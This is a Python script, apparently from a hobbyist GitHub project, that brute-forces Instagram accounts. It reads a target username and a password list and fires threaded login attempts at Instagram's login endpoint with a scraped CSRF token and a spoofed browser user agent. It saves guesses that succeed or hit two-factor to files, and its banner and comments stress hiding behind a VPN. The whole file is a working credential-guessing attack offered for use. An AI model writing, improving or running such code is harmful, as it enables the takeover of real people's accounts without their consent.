from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input
from script.script import clear
import time


CheckVersion = str(sys.version)
import re
from datetime import datetime
print('exicuting...')
time.sleep(3)
clear()

# add vpn question (do you have a vpn yess or no?)
  # if yes
    # contenue
  # if no
    # (Auto VPN script)

print('''    
\033[32m
┌┐ ┬─┐┬ ┬┌┬┐  ┌─┐┌─┐┬─┐┌─┐┌─┐   V1.0
├┴┐├┬┘│ │ │   ├┤ │ │├┬┘│  ├┤   
└─┘┴└─└─┘ ┴   └  └─┘┴└─└─┘└─┘     
\033[35m********** \033[38mInstgram Brute \033[35m**********
| \033[31mDeveloper - \033[35mDisease              \033[35m|
| \033[31mGithub - \033[35mCPScript                \033[35m|
| \033[31mPassList - \033[35mAttack.txt            \033[35m|
\033[35m************************************''')
# There is no reason for all of this shit to go on with the banner :(
print('''\033[31mNotice -> Brute forcing speeds will 
depend on your VPN's bit rate!!!\033[32m.''')
class InstaBrute(object):
    def __init__(self):

        try:
            user = input('username : ')
            Combo = input('passList : ')
            print('\n----------------------------')

        except:
            print('Script Stopped!')
            sys.exit()

        with open(Combo, 'r') as x:
            Combolist = x.read().splitlines()
        thread = []
        self.Coutprox = 0
        for combo in Combolist:
            password = combo.split(':')[0]
            t = threading.Thread(target=self.New_Br, args=(user, password))
            t.start()
            thread.append(t)
            time.sleep(0.9)
        for j in thread:
            j.join()

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def New_Br(self, user, pwd):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time = int(datetime.now().timestamp())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            r = s.get(link)
            csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": csrf
            })
            print(f'{user}:{pwd}\n----------------------------')

            if 'authenticated": true' in r.text:
                print(('' + user + ':' + pwd + ' --> Good hack '))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
            elif 'two_factor_required' in r.text:
                print(('' + user + ':' + pwd + ' -->  Good It has to be checked '))
                with open('results_NeedVerfiy.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')


InstaBrute()
